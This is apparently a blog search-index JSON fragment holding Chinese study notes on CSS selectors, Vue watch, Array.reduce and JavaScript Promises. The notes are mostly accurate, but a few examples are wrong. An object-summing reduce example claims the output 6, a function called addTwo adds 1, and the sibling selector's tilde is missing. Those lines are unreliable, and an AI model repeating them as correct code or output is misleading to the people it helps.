result;&#125;","categories":[],"tags":[]},{"title":"CSS组合","slug":"布局","date":"2022-01-17T02:19:52.000Z","updated":"2022-01-17T09:30:12.395Z","comments":true,"path":"2022/01/17/布局/","link":"","permalink":"https://coloey.github.io/2022/01/17/%E5%B8%83%E5%B1%80/","excerpt":"","text":"组合：直接组合： AB 满足A同时满足B eg:input:focus 后代组合：A B 选中B，如果它是A的子孙 eg:nav a 亲子组合：A&gt;B 选中B如果它是A的子元素 eg:section&gt;p 兄弟选择器 AB 选中B如果它在A后且和A同级 eg:h2p 相邻选择器： A+B 选中B，如果它紧跟在A后面 eg:h2+p","categories":[{"name":"HTML+CSS","slug":"HTML-CSS","permalink":"https://coloey.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"watch","slug":"watch","date":"2022-01-15T06:39:59.000Z","updated":"2022-01-30T15:44:57.822Z","comments":true,"path":"2022/01/15/watch/","link":"","permalink":"https://coloey.github.io/2022/01/15/watch/","excerpt":"","text":"watch()监视属性watch： 1 当被监视的属性变化时（也可以监视计算属性），回调函数自动调用，进行相关操作 2 监视的属性必须存在才能好进行监视 3 监视的两种写法： （1）在Vue.createApp时传入watch配置 （2）通过vm.$watch监视 4 深度监视 （1）Vue中的watch默认不监视对象内部值的改变（一层） （2）配置deep为true,可以检测对象内部值改变（多层） 监视多级结构中某个属性的变化：’number.a’ 监视多级结构中所有属性第1变化，用deep:true PS：（1）Vue自身可以检测对象内部值的改变但是Vue提供的watch默认不可以 （2）使用watch时根据数据的具体结构，决定是否采用深度监视 vm.$watch(expOrFn,callback,[options]) expOrFn:{string/Function} callback:{Function/Object} options:{Object} deep:{boolean} immediate:{boolean} 返回值：unwatch函数 用处：观察Vue实例上的一个表达式或者一个函数计算结果的变化，回调函数得到的参数为新值和旧值。表达式只接受简单的键路径，对于复杂表达式，用函数取代 12345678910111213141516171819202122232425262728293031323334//HTML&lt;div id=&quot;app&quot;&gt; &#123;&#123;a&#125;&#125;,&#123;&#123;b&#125;&#125;&lt;/div&gt;//键路径 &lt;script type=&quot;text/javascript&quot;&gt; var vm=new Vue(&#123; el:&quot;#app&quot;, data:&#123; a:&#123;value1:&#x27;hello&#x27;&#125;, b:&#123;value2:&#x27;beautiful&#x27;&#125; &#125; &#125;); vm.$watch(&#x27;b.value2&#x27;,function(newVal,oldVal)&#123; console.log(newVal,oldVal); &#125;); vm.b.value2=&#x27;bind&#x27;;//bind beautiful //修改对象内部的值但是侦听的是对象，对其属性或元素的更改不会触发侦听器，因为他们引用相同对象 vm.$watch(&#x27;a&#x27;,function(newVal,oldVal)&#123; console.log(newVal,oldVal); &#125;); vm.a.value1=&#x27;hei&#x27;;//没有侦听到//为了发现对象内部值的变化，可以在选项参数中指定 deep: true。这个选项同样适用于监听数组变更。 vm.$watch(&#x27;a&#x27;,function(newVal,oldVal)&#123; console.log(newVal,oldVal); &#125;,&#123;deep:true&#125;); vm.a.value1=&#x27;hei&#x27;;////在选项参数中指定 immediate: true 将立即以表达式的当前值触发回调 vm.$watch(&#x27;a&#x27;,function(newVal,oldVal)&#123; console.log(newVal,oldVal); &#125;,&#123;immediate:true&#125;); vm.a=&#123;&#125;//&#123;_ob_:Observer&#125;undefined &#123;_ob_:Observer&#125;&#123;_ob_:Observer&#125; &lt;/script&gt; 在带有immediate选项时不能在第一次回调时取消侦听给定的property 1234567const unwatch=vm.$watch( &#x27;a&#x27;, function(newVal,oldVal)&#123; console.log(newVal,oldVal); unwatch() &#125;,&#123;immediate:true&#125; )//报错 要在回调函数里调用一个取消侦听的函数应该先检查其函数的可用性 12345678let unwatch=null; unwatch=vm.$watch( &#x27;a&#x27;, function(newVal,oldVal)&#123; console.log(newVal,oldVal); if(unwatch)&#123;unwatch();&#125; &#125;,&#123;immediate:true&#125; ) Vue3中的watch两个“坑”： watch监视的是reactive定义的响应式数据则无法正确获得oldValue，watch监视的是reactive定义的响应式数据则强制开启深度监视,只能获取newValue,无法获取oldValue 监视reactive定义的某个对象中的属性（也是对象）,deep有效,仍然无法获取oldValue 关于.value: 如果ref定义的是一个数字或者字符，比如ref(0)不能用.value 如果ref定义的是一个对象，则里面的属性本质上是由reactive定义，如果要监视里面的属性则得用.value，.value后由reactive定义，则自动开启深度监视，或者开启深度监视 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 setup()&#123; let person=reactive(&#123; firstName:&quot;张&quot;, lastName:&quot;三&quot;, fullName:&#x27;&#x27;, job:&#123; one:&#x27;doctor&#x27;, tow:&#x27;teacher&#x27; &#125; &#125;) let sum=ref(0) let msg=ref(&quot;你好呀&quot;)//情况一：监视ref定义的响应式数据 watch(sum,(newValue,oldValue)=&gt;&#123; console.log(&quot;sum变化了&quot;,newValue,oldValue) &#125;) //情况二：监视多个ref定义的响应式数据 watch([sum,msg],(newValue,oldValue)=&gt;&#123; console.log(&quot;sum或msg变化了&quot;,newValue,oldValue) &#125;) //情况三：监视reactive定义的响应式数据：若watch监视的是reactive定义的响应式数据则无法正确获得oldValue，watch监视的是reactive定义的响应式数据则强制开启深度监视,只能获取newValue,无法获取oldValue watch(person,(newValue,oldValue)=&gt;&#123; console.log(&quot;person变化了&quot;,newValue,oldValue) &#125;,&#123;deep:false&#125;)//deep配置无效 //情况四:监视reactive定义的响应式数据中的某个属性 watch(()=&gt;person.firstName,(newValue,oldValue)=&gt;&#123; console.log(&quot;person的firstName变化了&quot;,newValue,oldValue) &#125;) //情况五：监视reactive定义的一个响应式数据中的某些属性 watch([()=&gt;person.firstName,()=&gt;person.lastName],(newValue,oldValue)=&gt;&#123; console.log(&quot;person的firstName/lastName变化了&quot;,newValue,oldValue) &#125;) //特殊情况监视reactive定义的某个对象中的属性（也是对象）,deep有效,仍然无法获取oldValue watch(()=&gt;person.job,(newValue,oldValue)=&gt;&#123; console.log(&quot;person的job变化了&quot;,newValue,oldValue) &#125;,&#123;deep:true&#125;) person.fullName=computed(&#123; get()&#123; return person.firstName+&#x27;-&#x27;+person.lastName &#125;, set(value)&#123; const nameArr=value.split(&#x27;-&#x27;) person.firstName=nameArr[0] person.lastName=nameArr[1] &#125; &#125;) watch() return &#123; person, sum, msg &#125; &#125;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[{"name":"watch","slug":"watch","permalink":"https://coloey.github.io/tags/watch/"}]},{"title":"addLoadEvent","slug":"addLoadEvent","date":"2022-01-10T09:41:16.000Z","updated":"2022-01-10T09:47:57.127Z","comments":true,"path":"2022/01/10/addLoadEvent/","link":"","permalink":"https://coloey.github.io/2022/01/10/addLoadEvent/","excerpt":"","text":"1234567891011function addLoadEvent(func)&#123; var oldonload=window.onload; if(typeof oldonload!=&#x27;function&#x27;)&#123; window.onload=func;//如果处理函数还没有绑定任何函数，就添加新函数 &#125;else&#123; window.onload=function()&#123; oldonload(); func(); &#125; &#125; &#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"reduce","slug":"reduce","date":"2022-01-07T03:30:23.000Z","updated":"2022-01-07T13:25:55.147Z","comments":true,"path":"2022/01/07/reduce/","link":"","permalink":"https://coloey.github.io/2022/01/07/reduce/","excerpt":"","text":"arr.reduce(callback(accumulator,currentValue,index,array),InitValue) callback:执行数组中的每个值的函数，包括4个参数： accumulator currentValue 数组中正在处理的元素。 index 可选 数组中正在处理的当前元素的索引。 如果提供了initialValue，则起始索引号为0，否则从索引1起始。 array可选 调用reduce()的数组 initialValue可选 作为第一次调用 callback函数时的第一个参数的值。 如果没有提供初始值，则将使用数组中的第一个元素。 在没有初始值的空数组上调用 reduce 将报错。 返回累计处理后的结果 求数组中的所有值的和12345678910var sum=[0,1,2,3].reduce(function(accumulator,currentValue)&#123;return accumulator+currentValue;&#125;,0)//6//累加对象数组里的值var InitValue=0;var sum=[&#123;x:1&#125;,&#123;x:2&#125;,&#123;x:3&#125;].reduce(function(accumulator,currentValue)&#123; return accumulator+currentValue;&#125;,InitValue);console.log(sum);//6 将二维数组转为一维1var flattened=[[0,1],[2,3],[4,5],[6,7]].reduce(function(a,b)&#123;return a.concat(b);&#125;,[]) 计算数组中每个元素出现的个数1234567891011var names=[&#x27;Alice&#x27;,&#x27;Bob&#x27;,&#x27;Ann&#x27;,&#x27;Alice&#x27;,&#x27;Bob&#x27;]; var countNames=names.reduce((allNames,name)=&gt;&#123; if(name in allNames)&#123; allNames[name]++; &#125; else&#123; allNames[name]=1; &#125; return allNames; &#125;,&#123;&#125;); console.log(countNames); 按照属性对object分类123456789101112131415161718var people=[ &#123;name:&#x27;Alice&#x27;,age:20&#125;, &#123;name:&#x27;Max&#x27;,age:20&#125;, &#123;name:&#x27;Jane&#x27;,age:21&#125; ] function groupBy(objectArray,property)&#123; return objectArray.reduce(function(acc,obj)&#123; var key=obj[property]; if(!acc[key])&#123; acc[key]=[]; &#125; acc[key].push(obj); return acc; &#125;,&#123;&#125;); &#125; var groupedPeople=groupBy(people,&#x27;age&#x27;); console.log(groupedPeople); 使用扩展运算符绑定包含在对象数组中的数组123456789var friends=[&#123; name:&#x27;Anna&#x27;, books:[&#x27;Bible&#x27;,&#x27;Harry Potter&#x27;], age:21 &#125;, &#123;name:&#x27;Bob&#x27;,books:[&#x27;War and Peace&#x27;],age:16&#125;, &#123;name:&#x27;Mike&#x27;,books:[&#x27;The Shining&#x27;,&#x27;The Lord of the Rings&#x27;],age:18&#125;]; var allBooks=friends.reduce((prev,curr)=&gt;&#123;return [...prev,...curr.books]&#125;,[&#x27;Alphabet&#x27;]); console.log(allBooks); 数组去重123456789let myArray=[6,6,6,2,3,3,4,4,4,5]; let myOrderedArray=myArray.reduce((accumulator,currval)=&gt;&#123; if(accumulator.indexOf(currval)==-1)&#123; accumulator.push(currval); &#125; return accumulator; &#125;,[]) console.log(myOrderedArray);","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"Promise","slug":"Promise","date":"2022-01-06T12:59:19.000Z","updated":"2022-01-07T13:00:23.474Z","comments":true,"path":"2022/01/06/Promise/","link":"","permalink":"https://coloey.github.io/2022/01/06/Promise/","excerpt":"","text":"期约状态机Promise可以通过 new 操作符来实例化。创建新期约时需要传入执行器（executor）函数作为参数 123let p = new Promise(() =&gt; &#123;&#125;);setTimeout(console.log, 0, p); // Promise &lt;pending&gt; 在把一个期约实例传给 console.log()时，控制台输出（可能因浏览器不同而略有差异）表明该实例处于待定（pending）状态。如前所述，期约是一个有状态的对象，可能处于如下 3 种状态之一： 待定（pending）是期约的最初始状态。在待定状态下，期约可以落定（settled）为代表成功的兑现（fulfilled）状态，或者代表失败的拒绝（rejected）状态。无论落定为哪种状态都是不可逆的。只要从待定转换为兑现或拒绝，期约的状态就不再改变。而有时候也称为“解决”，resolved） 兑现（fulfilled)每个期约只要状态切换为兑现，就会有一个私有的内部值（value） 拒绝（rejected）如果期约被拒绝，程序就会期待期约状态改变时可以拿到拒绝的理由 期约用途期约主要有两大用途。首先是抽象地表示一个异步操作。期约的状态代表期约是否完成。某些情况下，这个状态机就是期约可以提供的最有用的信息。 通过执行函数控制期约状态期约的状态是私有的，所以只能在内部进行操作。内部操作在期约的执行器函数中完成。执行器函数主要有两项职责：初始化期约的异步行为和控制状态的最终转换。其中，控制期约状态的转换是通过调用它的两个函数参数实现的。这两个函数参数通常都命名为 resolve()和 reject()。调用resolve()会把状态切换为兑现，调用 reject()会把状态切换为拒绝。另外，调用 reject()也会抛出错误 123456let p1=new Promise((resolve,reject)=&gt;resolve());setTimeout(console.log,0,p1);//Promise &lt;resolved&gt;let p2 = new Promise((resolve, reject) =&gt; reject());setTimeout(console.log, 0, p2); // Promise &lt;rejected&gt;// Uncaught error (in promise) 在前面的例子中，并没有什么异步操作，因为在初始化期约时，执行器函数已经改变了每个期约的状态，执行器函数是同步执行的。这是因为执行器函数是期约的初始化程序。 添加 setTimeout 可以推迟切换状态： 1234let p = new Promise((resolve, reject) =&gt; setTimeout(resolve, 1000));// 在 console.log 打印期约实例的时候，还不会执行超时回调（即 resolve()）setTimeout(console.log, 0, p); // Promise &lt;pending&gt; 无论 resolve()和 reject()中的哪个被调用，状态转换都不可撤销了。于是继续修改状态会静默失败，如下所示： 123456let p = new Promise((resolve, reject) =&gt; &#123;resolve();reject(); // 没有效果&#125;);setTimeout(console.log, 0, p); // Promise &lt;resolved&gt; Promise.resolve()下面两个期约实例实际上是一样的： let p1 = new Promise((resolve, reject) =&gt; resolve());let p2 = Promise.resolve(); 这个解决的期约的值对应着传给 Promise.resolve()的第一个参数。使用这个静态方法，实际上可以把任何值都转换为一个期约 12345678setTimeout(console.log,0,Promise.resolve());// Promise &lt;resolved&gt;: undefinedsetTimeout(console.log, 0, Promise.resolve(3));// Promise &lt;resolved&gt;: 3// 多余的参数会忽略setTimeout(console.log, 0, Promise.resolve(4, 5, 6));// Promise &lt;resolved&gt;: 4 对这个静态方法而言，如果传入的参数本身是一个期约，那它的行为就类似于一个空包装。因此，Promise.resolve()可以说是一个幂等方法 1234567891011let p = Promise.resolve(7);setTimeout(console.log, 0, p === Promise.resolve(p));// truesetTimeout(console.log, 0, p === Promise.resolve(Promise.resolve(p)));// true//这个幂等性会保留传入期约的状态：let p = new Promise(() =&gt; &#123;&#125;);setTimeout(console.log, 0, p); // Promise &lt;pending&gt;setTimeout(console.log, 0, Promise.resolve(p)); // Promise &lt;pending&gt;setTimeout(console.log, 0, p === Promise.resolve(p)); // true 注意，这个静态方法能够包装任何非期约值，包括错误对象，并将其转换为解决的期约。因此，也可能导致不符合预期的行为： 1234let p = Promise.resolve(new Error(&#x27;foo&#x27;));setTimeout(console.log, 0, p);// Promise &lt;resolved&gt;: Error: foo Promise.reject()与 Promise.resolve()类似，Promise.reject()会实例化一个拒绝的期约并抛出一个异步错误（这个错误不能通过 try/catch 捕获，而只能通过拒绝处理程序捕获）。下面的两个期约实例实际上是一样的： let p1 = new Promise((resolve, reject) =&gt; reject());let p2 = Promise.reject(); 这个拒绝的期约的理由就是传给 Promise.reject()的第一个参数。这个参数也会传给后续的拒绝处理程序： 1234let p = Promise.reject(3);setTimeout(console.log, 0, p); // Promise &lt;rejected&gt;: 3p.then(null, (e) =&gt; setTimeout(console.log, 0, e)); // 3 关键在于，Promise.reject()并没有照搬 Promise.resolve()的幂等逻辑。如果给它传一个期约对象，则这个期约会成为它返回的拒绝期约的理由： 123setTimeout(console.log, 0, Promise.reject(Promise.resolve()));// Promise &lt;rejected&gt;: Promise &lt;resolved&gt; 同步/异步执行的二元性123456789101112try &#123;throw new Error(&#x27;foo&#x27;);&#125; catch(e) &#123;console.log(e); // Error: foo&#125;try &#123;Promise.reject(new Error(&#x27;bar&#x27;));&#125; catch(e) &#123;console.log(e);&#125;// Uncaught (in promise) Error: bar 第一个 try/catch 抛出并捕获了错误，第二个 try/catch 抛出错误却没有捕获到,这里的同步代码之所以没有捕获期约抛出的错误，是因为它没有通过异步模式捕获错误。从这里就可以看出期约真正的异步特性：它们是同步对象（在同步执行模式中使用），但也是异步执行模式的媒介。在前面的例子中，拒绝期约的错误并没有抛到执行同步代码的线程里，而是通过浏览器异步消息队列来处理的。因此，try/catch 块并不能捕获该错误。代码一旦开始以异步模式执行，则唯一与之交互的方式就是使用异步结构——更具体地说，就是期约的方法。 Promise.prototype.then()Promise.prototype.then()是为期约实例添加处理程序的主要方法。这个 then()方法接收最多 两个参数：onResolved 处理程序和 onRejected 处理程序。这两个参数都是可选的，如果提供的话，则会在期约分别进入“兑现”和“拒绝”状态时执行。传给 then()的任何非函数类型的参数都会被静 默忽略。如果想只提供 onRejected 参数，那就要在 onResolved 参数的位置上传入 undefined。这 样有助于避免在内存中创建多余的对象 123456789101112131415function onResolved(id) &#123; setTimeout(console.log, 0, id, &#x27;resolved&#x27;); &#125; function onRejected(id) &#123; setTimeout(console.log, 0, id, &#x27;rejected&#x27;); &#125; let p1 = new Promise((resolve, reject) =&gt; setTimeout(resolve, 3000)); let p2 = new Promise((resolve, reject) =&gt; setTimeout(reject, 3000)); p1.then(() =&gt; onResolved(&#x27;p1&#x27;), () =&gt; onRejected(&#x27;p1&#x27;)); p2.then(() =&gt; onResolved(&#x27;p2&#x27;), () =&gt; onRejected(&#x27;p2&#x27;)); //（3 秒后）// p1 resolved // p2 rejected 1234567891011121314function onResolved(id) &#123; setTimeout(console.log, 0, id, &#x27;resolved&#x27;); &#125; function onRejected(id) &#123; setTimeout(console.log, 0, id, &#x27;rejected&#x27;); &#125; let p1 = new Promise((resolve, reject) =&gt; setTimeout(resolve, 3000)); let p2 = new Promise((resolve, reject) =&gt; setTimeout(reject, 3000)); // 非函数处理程序会被静默忽略，不推荐p1.then(&#x27;gobbeltygook&#x27;); // 不传 onResolved 处理程序的规范写法p2.then(null, () =&gt; onRejected(&#x27;p2&#x27;)); // p2 rejected（3 秒后 Promise.prototype.then()方法返回一个新的期约实例： 12345let p1 = new Promise(() =&gt; &#123;&#125;); let p2 = p1.then(); setTimeout(console.log, 0, p1); // Promise &lt;pending&gt; setTimeout(console.log, 0, p2); // Promise &lt;pending&gt; setTimeout(console.log, 0, p1 === p2); // false 这个新期约实例基于 onResovled 处理程序的返回值构建。换句话说，该处理程序的返回值会通过 Promise.resolve()包装来生成新期约。如果没有提供这个处理程序，则 Promise.resolve()就会 包装上一个期约解决之后的值。如果没有显式的返回语句，则 Promise.resolve()会包装默认的返回 值 undefined。 123456789101112131415161718192021222324252627282930313233let p1 = Promise.resolve(&#x27;foo&#x27;); // 若调用 then()时不传处理程序，则原样向后传let p2 = p1.then();setTimeout(console.log, 0, p2); // Promise &lt;resolved&gt;: foo // 这些都一样let p3 = p1.then(() =&gt; undefined); let p4 = p1.then(() =&gt; &#123;&#125;); let p5 = p1.then(() =&gt; Promise.resolve()); setTimeout(console.log, 0, p3); // Promise &lt;resolved&gt;: undefined setTimeout(console.log, 0, p4); // Promise &lt;resolved&gt;: undefined setTimeout(console.log, 0, p5); // Promise &lt;resolved&gt;: undefined //如果有显式的返回值，则 Promise.resolve()会包装这个值：// 这些都一样let p6 = p1.then(() =&gt; &#x27;bar&#x27;); let p7 = p1.then(() =&gt; Promise.resolve(&#x27;bar&#x27;)); setTimeout(console.log, 0, p6); // Promise &lt;resolved&gt;: bar setTimeout(console.log, 0, p7); // Promise &lt;resolved&gt;: bar // Promise.resolve()保留返回的期约let p8 = p1.then(() =&gt; new Promise(() =&gt; &#123;&#125;)); let p9 = p1.then(() =&gt; Promise.reject()); // Uncaught (in promise): undefined setTimeout(console.log, 0, p8); // Promise &lt;pending&gt; setTimeout(console.log, 0, p9); // Promise &lt;rejected&gt;: undefined//抛出异常会返回拒绝的期约： let p10 = p1.then(() =&gt; &#123; throw &#x27;baz&#x27;; &#125;); // Uncaught (in promise) baz setTimeout(console.log, 0, p10); // Promise &lt;rejected&gt; baz //注意，返回错误值不会触发上面的拒绝行为，而会把错误对象包装在一个解决的期约中：... let p11 = p1.then(() =&gt; Error(&#x27;qux&#x27;)); setTimeout(console.log, 0, p11); // Promise &lt;resolved&gt;: Error: qux onRejected 处理程序也与之类似：onRejected 处理程序返回的值也会被 Promise.resolve() 包装。乍一看这可能有点违反直觉，但是想一想，onRejected 处理程序的任务不就是捕获异步错误吗？ 因此，拒绝处理程序在捕获错误后不抛出异常是符合期约的行为，应该返回一个解决期约 12345678910111213141516171819202122232425262728let p1 = Promise.reject(&#x27;foo&#x27;); // 调用 then()时不传处理程序则原样向后传let p2 = p1.then(); // Uncaught (in promise) foosetTimeout(console.log, 0, p2); // Promise &lt;rejected&gt;: foo // 这些都一样let p3 = p1.then(null, () =&gt; undefined); let p4 = p1.then(null, () =&gt; &#123;&#125;); let p5 = p1.then(null, () =&gt; Promise.resolve()); setTimeout(console.log, 0, p3); // Promise &lt;resolved&gt;: undefined setTimeout(console.log, 0, p4); // Promise &lt;resolved&gt;: undefined setTimeout(console.log, 0, p5); // Promise &lt;resolved&gt;: undefined // 这些都一样let p6 = p1.then(null, () =&gt; &#x27;bar&#x27;); let p7 = p1.then(null, () =&gt; Promise.resolve(&#x27;bar&#x27;)); setTimeout(console.log, 0, p6); // Promise &lt;resolved&gt;: bar setTimeout(console.log, 0, p7); // Promise &lt;resolved&gt;: bar // Promise.resolve()保留返回的期约let p8 = p1.then(null, () =&gt; new Promise(() =&gt; &#123;&#125;)); let p9 = p1.then(null, () =&gt; Promise.reject()); // Uncaught (in promise): undefined setTimeout(console.log, 0, p8); // Promise &lt;pending&gt; setTimeout(console.log, 0, p9); // Promise &lt;rejected&gt;: undefined let p10 = p1.then(null, () =&gt; &#123; throw &#x27;baz&#x27;; &#125;); // Uncaught (in promise) baz setTimeout(console.log, 0, p10); // Promise &lt;rejected&gt;: baz let p11 = p1.then(null, () =&gt; Error(&#x27;qux&#x27;)); setTimeout(console.log, 0, p11); // Promise &lt;resolved&gt;: Error: qux Promise.prototype.catch()Promise.prototype.catch()方法用于给期约添加拒绝处理程序。这个方法只接收一个参数： onRejected 处理程序。事实上，这个方法就是一个语法糖，调用它就相当于调用 Promise.prototype. then(null, onRejected) 1234567let p = Promise.reject(); let onRejected = function(e) &#123; setTimeout(console.log, 0, &#x27;rejected&#x27;); &#125;; // 这两种添加拒绝处理程序的方式是一样的：p.then(null, onRejected); // rejected p.catch(onRejected); // rejected Promise.prototype.catch()返回一个新的期约实例： 12345let p1 = new Promise(() =&gt; &#123;&#125;); let p2 = p1.catch(); setTimeout(console.log, 0, p1); // Promise &lt;pending&gt; setTimeout(console.log, 0, p2); // Promise &lt;pending&gt; setTimeout(console.log, 0, p1 === p2); // false Promise.prototype.finally()Promise.prototype.finally()方法用于给期约添加 onFinally 处理程序，这个处理程序在期 约转换为解决或拒绝状态时都会执行。这个方法可以避免 onResolved 和 onRejected 处理程序中出 现冗余代码。但 onFinally 处理程序没有办法知道期约的状态是解决还是拒绝，所以这个方法主要用清理代码 1234567let p1 = Promise.resolve(); let p2 = Promise.reject(); let onFinally = function() &#123; setTimeout(console.log, 0, &#x27;Finally!&#x27;) &#125; p1.finally(onFinally); // Finally p2.finally(onFinally); // Finally Promise.prototype.finally()方法返回一个新的期约实例： 12345let p1 = new Promise(() =&gt; &#123;&#125;); let p2 = p1.finally();setTimeout(console.log, 0, p1); // Promise &lt;pending&gt; setTimeout(console.log, 0, p2); // Promise &lt;pending&gt; setTimeout(console.log, 0, p1 === p2); // false 这个新期约实例不同于 then()或 catch()方式返回的实例。因为 onFinally 被设计为一个状态 无关的方法，所以在大多数情况下它将表现为父期约的传递 1234567891011121314151617181920212223242526let p1 = Promise.resolve(&#x27;foo&#x27;); // 这里都会原样后传let p2 = p1.finally(); let p3 = p1.finally(() =&gt; undefined); let p4 = p1.finally(() =&gt; &#123;&#125;); let p5 = p1.finally(() =&gt; Promise.resolve()); let p6 = p1.finally(() =&gt; &#x27;bar&#x27;); let p7 = p1.finally(() =&gt; Promise.resolve(&#x27;bar&#x27;)); let p8 = p1.finally(() =&gt; Error(&#x27;qux&#x27;)); setTimeout(console.log, 0, p2); // Promise &lt;resolved&gt;: foo setTimeout(console.log, 0, p3); // Promise &lt;resolved&gt;: foo setTimeout(console.log, 0, p4); // Promise &lt;resolved&gt;: foo setTimeout(console.log, 0, p5); // Promise &lt;resolved&gt;: foo setTimeout(console.log, 0, p6); // Promise &lt;resolved&gt;: foo setTimeout(console.log, 0, p7); // Promise &lt;resolved&gt;: foo setTimeout(console.log, 0, p8); // Promise &lt;resolved&gt;: foo //如果返回的是一个待定的期约，或者 onFinally 处理程序抛出了错误（显式抛出或返回了一个拒绝期约），则会返回相应的期约（待定或拒绝）// Promise.resolve()保留返回的期约let p9 = p1.finally(() =&gt; new Promise(() =&gt; &#123;&#125;)); let p10 = p1.finally(() =&gt; Promise.reject()); // Uncaught (in promise): undefined setTimeout(console.log, 0, p9); // Promise &lt;pending&gt; setTimeout(console.log, 0, p10); // Promise &lt;rejected&gt;: undefined let p11 = p1.finally(() =&gt; &#123; throw &#x27;baz&#x27;; &#125;); // Uncaught (in promise) baz setTimeout(console.log, 0, p11); // Promise &lt;rejected&gt;: baz 非重入期约方法当期约进入落定状态时，与该状态相关的处理程序仅仅会被排期，而非立即执行。跟在添加这个处 理程序的代码之后的同步代码一定会在处理程序之前先执行。即使期约一开始就是与附加处理程序关联 的状态，执行顺序也是这样的。这个特性由 JavaScript 运行时保证，被称为“非重入”（non-reentrancy） 特性。 1234567891011121314151617let synchronousResolve; // 创建一个期约并将解决函数保存在一个局部变量中let p = new Promise((resolve) =&gt; &#123; synchronousResolve = function() &#123; console.log(&#x27;1: invoking resolve()&#x27;); resolve(); console.log(&#x27;2: resolve() returns&#x27;); &#125;; &#125;); p.then(() =&gt; console.log(&#x27;4: then() handler executes&#x27;)); synchronousResolve(); console.log(&#x27;3: synchronousResolve() returns&#x27;); // 实际的输出：// 1: invoking resolve() // 2: resolve() returns // 3: synchronousResolve() returns // 4: then() handler executes 在这个例子中，即使期约状态变化发生在添加处理程序之后，处理程序也会等到运行的消息队列让 它出列时才会执行。 传递解决值和拒绝理由到了落定状态后，期约会提供其解决值（如果兑现）或其拒绝理由（如果拒绝）给相关状态的处理 程序。拿到返回值后，就可以进一步对这个值进行操作。比如，第一次网络请求返回的 JSON 是发送第 二次请求必需的数据，那么第一次请求返回的值就应该传给 onResolved 处理程序继续处理。当然，失 败的网络请求也应该把 HTTP 状态码传给 onRejected 处理程序。 在执行函数中，解决的值和拒绝的理由是分别作为 resolve()和 reject()的第一个参数往后传 的。然后，这些值又会传给它们各自的处理程序，作为 onResolved 或 onRejected 处理程序的唯一 参数。 1234let p1 = new Promise((resolve, reject) =&gt; resolve(&#x27;foo&#x27;)); p1.then((value) =&gt; console.log(value)); // foo let p2 = new Promise((resolve, reject) =&gt; reject(&#x27;bar&#x27;)); p2.catch((reason) =&gt; console.log(reason)); // bar then()和 catch()的 onRejected 处理程序在语义上相当于 try/catch。出发点都是捕获错误之 后将其隔离，同时不影响正常逻辑执行。为此，onRejected 处理程序的任务应该是在捕获异步错误之 后返回一个解决的期约。下面的例子中对比了同步错误处理与异步错误处理： 123456789101112131415161718192021console.log(&#x27;begin synchronous execution&#x27;); try &#123; throw Error(&#x27;foo&#x27;); &#125; catch(e) &#123; console.log(&#x27;caught error&#x27;, e); &#125; console.log(&#x27;continue synchronous execution&#x27;); // begin synchronous execution // caught error Error: foo // continue synchronous execution new Promise((resolve, reject) =&gt; &#123; console.log(&#x27;begin asynchronous execution&#x27;); reject(Error(&#x27;bar&#x27;)); &#125;).catch((e) =&gt; &#123; console.log(&#x27;caught error&#x27;, e); &#125;).then(() =&gt; &#123; console.log(&#x27;continue asynchronous execution&#x27;); &#125;); // begin asynchronous execution // caught error Error: bar // continue asynchronous execution 期约连锁每个后续的处理程序都会等待前一个期约解决，然后实例化一个新期约并返回它。这种结构可以简 洁地将异步任务串行化，解决之前依赖回调的难题 1234567891011121314function delayedResolve(str) &#123; return new Promise((resolve, reject) =&gt; &#123; console.log(str); setTimeout(resolve, 1000); &#125;); &#125;delayedResolve(&#x27;p1 executor&#x27;) .then(() =&gt; delayedResolve(&#x27;p2 executor&#x27;)) .then(() =&gt; delayedResolve(&#x27;p3 executor&#x27;)) .then(() =&gt; delayedResolve(&#x27;p4 executor&#x27;)) // p1 executor（1 秒后）// p2 executor（2 秒后）// p3 executor（3 秒后）// p4 executor（4 秒后） Promise.all()Promise.all方法用于将多个 Promise 实例，这个静态方法接收一个可迭代对象，将参数转为 Promise 实例，再包装成一个新的 Promise 实例。 合成的期约只会在每个包含的期约都解决之后才解决 如果至少有一个包含的期约待定，则合成的期约也会待定。如果有一个包含的期约拒绝，则合成的 期约也会拒绝 1234567//永远待定let p1=Promise.all([new Promise(()=&gt;&#123;&#125;)]);setTimeout(console.log,0,p1);//Promise &lt;pending&gt;//一次拒绝会导致最终期约拒绝let p2=Promise.all([Promise.resolve(),Promise.reject(),Promise.resolve()]);setTimeout(console.log,0,p2);//Promise &lt;rejected&gt;//Uncaught (in promise) undefined 如果所有期约都成功解决，则合成期约的解决值就是所有包含期约解决值的数组，按照迭代器顺序: 1234567891011121314let p = Promise.all([ Promise.resolve(3), Promise.resolve(), Promise.resolve(4) ]); p.then((values) =&gt; setTimeout(console.log, 0, values)); // [3, undefined, 4] // 虽然只有第一个期约的拒绝理由会进入 // 拒绝处理程序，第二个期约的拒绝也// 会被静默处理，不会有错误跑掉let p = Promise.all([ Promise.reject(3), new Promise((resolve, reject) =&gt; setTimeout(reject, 1000)) ]); p.catch((reason) =&gt; setTimeout(console.log, 0, reason)); // 3 Promise.race()Promise.race()静态方法返回一个包装期约，是一组集合中最先解决或拒绝的期约的镜像。这个 方法接收一个可迭代对象，返回一个新期约 12345678910111213141516171819// 解决先发生，超时后的拒绝被忽略let p1 = Promise.race([ Promise.resolve(3), new Promise((resolve, reject) =&gt; setTimeout(reject, 1000)) ]); setTimeout(console.log, 0, p1); // Promise &lt;resolved&gt;: 3 // 拒绝先发生，超时后的解决被忽略let p2 = Promise.race([ Promise.reject(4), new Promise((resolve, reject) =&gt; setTimeout(resolve, 1000)) ]); setTimeout(console.log, 0, p2); // Promise &lt;rejected&gt;: 4 // 迭代顺序决定了落定顺序let p3 = Promise.race([ Promise.resolve(5), Promise.resolve(6), Promise.resolve(7) ]); setTimeout(console.log, 0, p3); // Promise &lt;resolved&gt;: 5 串行期约合成1234567function addTwo(x)&#123;return x+1;&#125;function addThree(x)&#123;return x+3;&#125;function addFive(x)&#123;return x+5;&#125;function addTen(x)&#123; return [addTwo,addThree,addFive].reduce((promise,fn)=&gt;promise.then(fn),Promise.resolve(x));&#125;addTen(8).then(console.log); donePromise 